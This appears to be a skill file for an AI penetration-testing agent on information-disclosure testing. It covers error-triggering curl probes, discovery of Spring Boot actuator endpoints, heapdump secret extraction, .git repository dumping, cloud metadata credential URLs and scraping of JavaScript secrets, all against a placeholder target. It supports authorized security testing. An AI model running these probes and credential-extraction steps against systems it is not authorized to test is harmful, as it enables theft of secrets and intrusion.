---
name: info-disclosure-testing
description: Information disclosure detection — error messages, files, headers, debug endpoints
origin: AI Threat Hunting
---

# Information Disclosure Testing

> **Kali MCP audit headers:** when calling Kali MCP for work governed by this skill, set `X-Technique: INFO-DISCLOSURE` and `X-Probe-Kind` per the phase — `fingerprint` for header/banner/stack-trace probes, `payload` for directed requests to known high-value paths (`/actuator/env`, `/.git/config`, `/.env`, debug endpoints), `exploit` for retrieval of secrets, credentials, heap dumps, or internal state that proves impact.

## Reality Check

Info disclosure severity depends entirely on WHAT is disclosed. A stack trace with internal paths = low. An exposed `/actuator/env` with database credentials = critical. This skill is about finding the HIGH-VALUE disclosures, not cataloging every verbose header. If you spend 30 minutes documenting `Server: nginx/1.24.0` headers, you have wasted your time. If you spend 5 minutes finding `/actuator/heapdump` with cleartext secrets, you have a critical finding.

## When to Activate

- Reconnaissance phase of any engagement (run this early -- disclosures feed every other test class)
- Verbose error messages observed during other testing
- Java/Spring applications (actuator endpoints are extremely common and high-value)
- Any application where `.git/` or `.env` might be exposed
- After finding interesting technology stacks that have known debug endpoints

## Tools

- `curl` (header inspection, endpoint probing, error triggering)
- Burp Suite (passive scanning, response analysis across all traffic)
- `ffuf` / `feroxbuster` (file and directory brute-force)
- `git-dumper` (full `.git` repository reconstruction)
- `trufflehog` / `gitleaks` (secret scanning in reconstructed repos or exposed source)

---

## Value Tiers

Structure your testing around these tiers. Start from the top -- critical disclosures are what get paid. Stop wasting time at the bottom.

### Critical: Credentials in Responses

These are immediately exploitable. Each one should be tested, extracted, and validated.

**Direct credential exposure:**
- `.env` files — database passwords, API keys, cloud credentials, JWT secrets
- `/actuator/env` (Spring Boot) — every environment variable including secrets
- `/actuator/heapdump` (Spring Boot) — full JVM heap, extract with `jhat` or `strings | grep -i password`
- `/server-info`, `/server-status` (Apache) — connection details, sometimes internal auth headers
- `/phpinfo.php`, `/info.php` — full PHP config including database connection strings, SMTP passwords
- Error messages that include credentials — database connection failures that print the connection string
- API responses that return more fields than the UI displays (passwords, tokens, internal IDs in JSON)
- Debug endpoints that dump request context including Authorization headers from other users

**Cloud metadata (when SSRF or exposed proxy exists):**
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — AWS IAM role credentials
- `http://metadata.google.internal/computeMetadata/v1/` — GCP service account tokens
- Azure IMDS at `http://169.254.169.254/metadata/instance`

### High: Internal Architecture

Not directly exploitable but dramatically expands the attack surface and enables chaining.

**Internal network information:**
- Internal IP addresses in response headers (`X-Forwarded-For`, `X-Real-IP`, `Via`, custom headers)
- Internal hostnames in error messages (database server names, service mesh addresses, queue servers)
- Load balancer / reverse proxy identity leaking in headers or error pages
- DNS names of internal services in stack traces or debug output

**Application architecture:**
- `/actuator/mappings` (Spring Boot) — complete API route map including admin and internal endpoints
- `/actuator/configprops` (Spring Boot) — full application configuration tree
- GraphQL introspection (`{__schema{types{name,fields{name,type{name}}}}}`) — full schema exposes every query, mutation, type, and field. This is the single most valuable recon finding in a GraphQL application.
- Swagger/OpenAPI specs at `/swagger.json`, `/api-docs`, `/v2/api-docs`, `/v3/api-docs` — full API surface map
- WSDL files for SOAP services — complete operation list and data types
- Debug endpoints showing request routing, middleware chain, or feature flags

### Medium: Technology and Version

Useful for CVE matching and targeted exploitation. Worth noting but not worth a standalone report unless it leads to something.

**Stack traces with library versions:**
- Java: `at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:897)` reveals Spring version
- Python: Django debug page with full traceback and settings (if `DEBUG=True` in production)
- Node.js: unhandled rejection with `node_modules` paths revealing exact package versions
- PHP: `Warning: mysqli_connect()` with file paths and PHP version

**Headers:**
- `Server: Apache/2.4.51` — check CVE databases for that specific version
- `X-Powered-By: PHP/7.4.3` — PHP 7.4 is EOL, known vulnerabilities
- `X-AspNet-Version`, `X-AspNetMvc-Version` — version-specific vulnerabilities
- Cookie names as technology fingerprints: `JSESSIONID` (Java), `PHPSESSID` (PHP), `ASP.NET_SessionId` (.NET), `_rails_session` (Rails)

### Low: Verbose Errors Without Sensitive Data

Generic stack traces, verbose 404 pages, "null pointer at line 42" without file paths or secrets. Not worth reporting on their own. Capture them via `./scripts/assess.py record-intel note <json-file>` for context but do not create findings.

---

## Active Disclosure Techniques

Do not passively wait for errors. Actively trigger them -- different error handlers expose different information.

### Malformed Content-Type

Send requests with unexpected Content-Type values to trigger parser errors:

```bash
# Send JSON body with wrong Content-Type
curl -X POST https://target.example/api/endpoint \
  -H "Content-Type: text/xml" \
  -d '{"key":"value"}'

# Send completely invalid Content-Type
curl -X POST https://target.example/api/endpoint \
  -H "Content-Type: ../../../../etc/passwd" \
  -d 'test'

# Omit Content-Type on POST
curl -X POST https://target.example/api/endpoint \
  -d '{"key":"value"}'
```

Parser errors often reveal the framework, version, and internal routing. A Spring app will throw a `HttpMediaTypeNotSupportedException` with the full class path. A Django app in debug mode will show the middleware chain.

### Oversized Requests

```bash
# Oversized header — triggers proxy/WAF limit errors
python3 -c "print('X-Padding: ' + 'A'*100000)" | curl -X GET https://target.example/ -H @-

# Oversized body — triggers application-level limit errors
dd if=/dev/urandom bs=1M count=100 | curl -X POST https://target.example/upload -d @-

# Many parameters — triggers parameter limit errors
curl -X POST https://target.example/api -d "$(python3 -c "print('&'.join([f'p{i}=v' for i in range(10000)]))")"
```

Limit errors often reveal the proxy layer (nginx vs HAProxy vs CloudFront), maximum sizes, and sometimes internal architecture when different layers return different errors.

### Special Characters in Paths

```bash
# Null byte — triggers different error handler in some frameworks
curl -s "https://target.example/%00"
# Unicode — can trigger encoding errors
curl -s "https://target.example/%c0%ae%c0%ae/"
# Long path — triggers path length limit errors
curl -s "https://target.example/$(python3 -c "print('A/'*500)")"
# Semicolon — triggers path parameter parsing in some frameworks
curl -s "https://target.example/;jsessionid=test"
```

### Type Confusion in Parameters

```bash
# Send array where string expected
curl -X POST https://target.example/api -H "Content-Type: application/json" -d '{"id":["1","2"]}'
# Send object where string expected
curl -X POST https://target.example/api -H "Content-Type: application/json" -d '{"id":{"key":"value"}}'
# Send null
curl -X POST https://target.example/api -H "Content-Type: application/json" -d '{"id":null}'
# Special float values
curl -X POST https://target.example/api -H "Content-Type: application/json" -d '{"amount":1e308}'
# Deeply nested JSON
python3 -c "import json; d={'a':None}; c=d; [c.update({'a':{'a':None}}) or None for _ in range(200)]; print(json.dumps(d))" | \
  curl -X POST https://target.example/api -H "Content-Type: application/json" -d @-
```

Type confusion errors are the most reliable way to force 500 responses that leak framework details, database types, and internal structure.

---

## Spring Boot Actuator Deep-Dive

The single most common high-value disclosure in Java applications. Spring Boot Actuator endpoints are exposed by default in many configurations, and even "secured" deployments frequently misconfigure access controls.

### Endpoint Priority (highest value first)

| Endpoint | Value | What It Exposes |
|---|---|---|
| `/actuator/heapdump` | Critical | Full JVM heap — extract with `strings heapdump.hprof \| grep -i "password\|secret\|key\|token"`. Contains every object in memory including cleartext secrets, session tokens, and database credentials. |
| `/actuator/env` | Critical | All environment variables and Spring properties. Database URLs with credentials, API keys, JWT signing secrets, cloud credentials. Properties marked `******` can sometimes be extracted via the `/actuator/env` POST endpoint (Spring Boot 1.x) to override a property and trigger its value to appear in a subsequent request. |
| `/actuator/configprops` | High | Full application configuration tree. Connection pool settings, feature flags, internal service URLs, cache configurations. |
| `/actuator/mappings` | High | Every registered HTTP endpoint with method, path, and handler class. This is a complete attack surface map — it reveals admin endpoints, internal APIs, and debug routes that directory brute-forcing would miss. |
| `/actuator/beans` | Medium | All Spring beans with dependencies. Reveals internal architecture, custom security filters, and authentication providers. |
| `/actuator/loggers` | Medium | Logger configuration. POST to `/actuator/loggers/<name>` to change log level to DEBUG, then trigger operations to leak sensitive data in logs. |
| `/actuator/trace` or `/actuator/httptrace` | High | Recent HTTP requests/responses including headers. May contain Authorization headers, session cookies, and API keys from other users. |
| `/actuator/jolokia` | Critical | If present, provides JMX access. Can lead to RCE via MBean manipulation. |

### Discovery

```bash
# Standard paths
for path in actuator actuator/env actuator/heapdump actuator/mappings actuator/configprops actuator/beans actuator/trace actuator/httptrace actuator/loggers actuator/jolokia actuator/health; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.example/$path")
  echo "$code $path"
done

# Alternative base paths (common misconfigurations)
for base in manage management admin internal monitoring; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.example/$base/actuator/env")
  echo "$code $base/actuator/env"
done

# Non-standard ports (actuator sometimes bound to a different port)
for port in 8081 8443 9090 9443; do
  curl -s -o /dev/null -w "%{http_code} " "https://target.example:$port/actuator/env" && echo "port $port"
done
```

### Exploitation: Heapdump Secret Extraction

```bash
# Download heapdump
curl -o heapdump.hprof https://target.example/actuator/heapdump

# Quick secret extraction
strings heapdump.hprof | grep -iE "(password|secret|token|key|credential|jdbc|mysql|postgres|mongo|redis|aws_|AKIA)" | sort -u

# Extract with Eclipse MAT for structured analysis
# OQL query: SELECT * FROM java.util.Hashtable$Entry WHERE key.toString() LIKE ".*password.*"
```

---

## .git Exposure Exploitation

Finding `/.git/HEAD` returning `ref: refs/heads/main` is not the end -- it is the beginning. Full repository reconstruction gives you the complete source code and, critically, the entire commit history where secrets are frequently committed and then "removed."

### Verification

```bash
# Quick check
curl -s https://target.example/.git/HEAD
# Should return: ref: refs/heads/main (or similar)

# Check if directory listing is enabled
curl -s https://target.example/.git/
# If 403 (directory listing off) but .git/HEAD returns 200, individual files are still accessible
```

### Full Repository Reconstruction

```bash
# git-dumper handles the reconstruction automatically
pip install git-dumper
git-dumper https://target.example/.git/ ./dumped-repo

# Alternative: GitTools
git clone https://github.com/internetwache/GitTools
./GitTools/Dumper/gitdumper.sh https://target.example/.git/ ./dumped-repo
```

### Post-Reconstruction Secret Hunting

This is where the real value lives. Developers commit secrets, then remove them in a later commit, thinking they are gone. They are not.

```bash
cd ./dumped-repo

# Search entire commit history for secrets
trufflehog filesystem --directory . --no-update

# Or with gitleaks
gitleaks detect --source . -v

# Manual: search all diffs in history
git log --all --full-history -p | grep -iE "(password|secret|api[_-]?key|token|credential|AKIA)" | head -50

# Check specific files that commonly contain secrets
git log --all --full-history -p -- "*.env" "*.env.*" "config/*" "*.yml" "*.yaml" "*.json" "*.properties" | head -100
```

**Common finds:** AWS access keys (AKIA...), database connection strings, JWT signing secrets, OAuth client secrets, SMTP passwords, private keys. Every secret found must be validated -- test if it still works.

---

## Client-Side Disclosure

### JavaScript Source Maps

`.js.map` files expose the original unminified source code. If source maps are deployed to production:

```bash
# Find source map references in JS files
curl -s https://target.example/static/app.js | grep -o "sourceMappingURL=.*"
# Fetch the source map
curl -s https://target.example/static/app.js.map | python3 -m json.tool | head -50
```

Source maps reveal: internal API endpoints, authentication logic, business logic, hardcoded secrets, and comments that were supposed to be stripped.

### Inline Secrets in JavaScript

```bash
# Download all JS files and search
curl -s https://target.example/static/app.js | grep -iE "(api[_-]?key|secret|token|password|credential|authorization)" | head -20
```

Common pattern: SPA frameworks that embed API keys, Firebase configs, or internal service URLs directly in the JavaScript bundle. The key question is whether the exposed key grants meaningful access.

### HTML Comments

```bash
# Check page source for comments
curl -s https://target.example/ | grep -o "<!--.*-->" | head -20
```

Look for: TODO comments with internal URLs, commented-out admin links, debug flags, developer notes with credentials or internal architecture.

---

## What to Record

For each disclosure finding:

- **Exact location** — URL, header name, response body offset, or file path
- **What was disclosed** — the specific data, not just "sensitive information"
- **Value tier** — Critical/High/Medium/Low per the tiers above
- **Validation** — for credentials, did you verify they work? For internal architecture, does it reveal something the attacker could not otherwise discover?
- **Chain potential** — which other test classes does this disclosure feed? (e.g., actuator/mappings reveals hidden admin API -> test for auth bypass; .git repo reveals JWT secret -> forge tokens)

Severity mapping:
- **Critical** — Working credentials, heapdump with secrets, exposed cloud metadata
- **High** — Full source code exposure, complete API surface map, internal architecture enabling pivots
- **Medium** — Version information leading to specific CVE exploitation
- **Low/Info** — Verbose errors, technology fingerprints, cookie name leakage (do not report standalone)

## Kill Signals — Stop Testing When
- Only LOW-tier disclosures found (Server header, X-Powered-By) with no matching CVEs → record as INFO at most, move on
- Actuator/debug endpoints all return 404/403 → not exposed, move on to other vectors
- Credentials found in actuator/env or .env file → CRITICAL, validate credentials work, record finding, stop disclosure hunting
- .git exposed → extract repo, search for secrets in history, record findings, stop other disclosure tests

## Escalate When
- A 403 or 401 on `/actuator`, `/debug`, `/console`, `/swagger`, `/api-docs`, `/metrics`, `/.git/HEAD`, or `/.env` means the path exists — enumerate sub-resources (`/actuator/heapdump`, `/actuator/env`, `/.git/config`, `/swagger.json`) because parent ACLs frequently miss children
- A verbose error or stack trace leaks a framework, DB driver, absolute path, internal hostname, queue name, cloud account ID, or commit hash — each is a pivot seed: framework enables targeted CVE checks, absolute paths enable LFI/traversal payloads, commit hashes enable source-code retrieval
- A Backup/`.bak`/`.old`/`~`/`.swp`/`.DS_Store`/`Thumbs.db`/`.idea/`/`.vscode/` file returns 200 on any path — sweep the full file-extension backup list across every discovered directory, not just the site root
- HTTP response headers leak Kubernetes pod names, internal service names (via `Via`, `X-Served-By`, `Server-Timing`), or AWS/Azure/GCP identifiers — the infrastructure is talking, map the internal architecture before moving on
- Version banners match a known-vulnerable release OR the target runs a managed platform (Confluence, Jira, GitLab, Jenkins, Sitecore, Citrix, Fortinet) — pull the CVE list for that exact version and validate the highest-impact one

## Extended Resources

- `agent/references/payloads/info-disclosure-probes.md` — standard endpoints checklist (/metrics, /.env, /actuator, cloud metadata)
